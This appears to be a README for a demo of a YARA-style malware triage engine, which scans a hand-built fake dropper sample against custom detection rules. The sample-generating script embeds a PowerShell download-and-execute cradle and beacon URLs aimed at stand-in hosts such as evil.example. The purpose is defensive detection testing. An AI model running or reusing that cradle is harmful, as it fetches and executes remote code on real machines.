# 02-deep — YARA-subset triage of a suspicious dropper

This demo runs the YARARUN rule engine against a synthetic-but-realistic
malware artifact (`suspicious_sample.bin`) using both the bundled triage
pack and a custom ruleset (`triage.yar`) that exercises the harder engine
features: **hex strings with wildcards/jumps**, **regex strings**,
**`#count` comparisons**, **offset anchoring**, and **`N of (...)`** set
conditions.

## The sample

`suspicious_sample.bin` is hand-built (no live malware) to trip several
detections at once:

- an `MZ … PE\0\0` header with a wildcarded DOS stub + jump region
- UPX packer markers (`UPX0` / `UPX1` / `UPX!`)
- an encoded PowerShell download-cradle (`powershell -enc IEX … DownloadString … FromBase64String`)
- two hardcoded C2 URLs plus a `.onion` fallback

The file is binary; regenerate it deterministically with:

```python
blob = bytearray()
blob += b"\x4D\x5A\x90\x00" + b"\x00" * 8 + b"\x50\x45\x00\x00"
blob += b"UPX0\x00UPX1\x00UPX!"
blob += b"\npowershell -enc IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1');FromBase64String\n"
blob += b"http://cdn.bad-domain.test/beacon http://c2.evil.test/gate.php abcdefghij234567.onion\n"
open("suspicious_sample.bin", "wb").write(blob)
```

## Run it

Scan with the bundled triage pack (human table):

```
python -m yararun scan demos/02-deep/suspicious_sample.bin
```

Scan with the custom ruleset, JSON output (machine-readable, non-zero exit
when actionable findings exist):

```
python -m yararun --format json scan -r demos/02-deep/triage.yar \
    demos/02-deep/suspicious_sample.bin
echo "exit=$?"          # -> 1, because high/critical matches were found
```

Validate a ruleset before deploying it:

```
python -m yararun compile demos/02-deep/triage.yar
```

List every rule the engine has loaded (severity, tags, condition):

```
python -m yararun rules
python -m yararun --format json rules -r demos/02-deep/triage.yar
```

## Expected matches (custom ruleset)

| Rule                          | Severity | Why it fires                                  |
|-------------------------------|----------|-----------------------------------------------|
| `Dropper_PowerShell_Chain`    | high     | `powershell` + 3 of enc/DownloadString/b64/IEX |
| `Embedded_PE_via_HexHeader`   | medium   | `{ 4D 5A ?? ?? [4-64] 50 45 00 00 }` matches  |
| `C2_Beacon_URL`               | high     | one `.onion` + `#url >= 2`                     |

A clean text file produces zero matches and a `0` exit code, so YARARUN
slots cleanly into CI / pre-commit malware gates.
